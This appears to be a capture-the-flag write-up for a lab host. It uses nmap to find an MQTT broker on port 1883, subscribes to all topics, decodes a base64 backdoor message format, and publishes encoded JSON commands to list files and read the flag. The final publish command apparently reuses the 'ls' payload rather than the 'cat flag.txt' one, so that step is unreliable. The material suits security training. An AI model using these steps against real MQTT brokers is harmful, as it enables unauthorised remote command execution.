IP address 10.10.59.207

#nmap #mosquitto #base64


# Nmap
```bash
nmap -sC -sV 10.10.59.207 -T5
```
![[Pasted image 20240610203505.png]]
All standard ports are filtered with the Nmap scan. Switching to scanning all ports to see which ones are open.
```bash
nmap -p- 10.10.59.207
```
After the scan we see that the only port open is1883. 
### open ports
- 1883 (mqtt)

![[Pasted image 20240610204254.png]]

# What is mosquitto

> [!NOTE]
> The MQTT protocol provides a lightweight method of carrying out messaging using a publish/subscribe model. This makes it suitable for Internet of Things messaging such as with low power sensors or mobile devices such as phones, embedded computers or microcontrollers.
> https://www.eginnovations.com/documentation/Mosquitto-MQTT/What-is-Mosquitto-MQTT.htm
![[Pasted image 20240610213041.png]]

## Commands we will need

| Commands      | Descriptions                                               |
| ------------- | ---------------------------------------------------------- |
| mosquitto_sub | command line utility for subscribing to topics on a broker |
| mosquitto_pub | command line utility for publishing messages to a broker   |

## Installing the software

```bash
sudo apt-get install mosquitto mosquitto-clients
```

## Subscribing to all groups
```bash
mosquitto_sub -t "#" -h 10.10.59.207
```

## Decoding initial message
After some time we see a long base64 string that does not match everything else being logged. Decoding the base64 shows us the what is publishing the suspicious things.
![[Pasted image 20240610205607.png]]

## Publishing a message
```bash
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.59.207 -m "test"
```

Publishing a message with test returns a base64 encoded string. Decoding the string states that test is an invalid command. Lets fix the issue and try again

```python
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```
![[Pasted image 20240610211410.png]]
## Formatting the command
After fixing the issue we need to encode this command in base64.
```python
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```
```python
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
```
![[Pasted image 20240610211931.png]]
## Catting the flag
Now that we see what the flag filename is called let's cat the flag. We will follow the same format. Change the command to cat flag.txt, base64 encode the message, and than publish it.
```bash
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
```
```python
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
```
```bash
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.59.207 -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo="
```

![[Pasted image 20240610212131.png]]
# Resources
https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto
https://www.eginnovations.com/documentation/Mosquitto-MQTT/What-is-Mosquitto-MQTT.htm
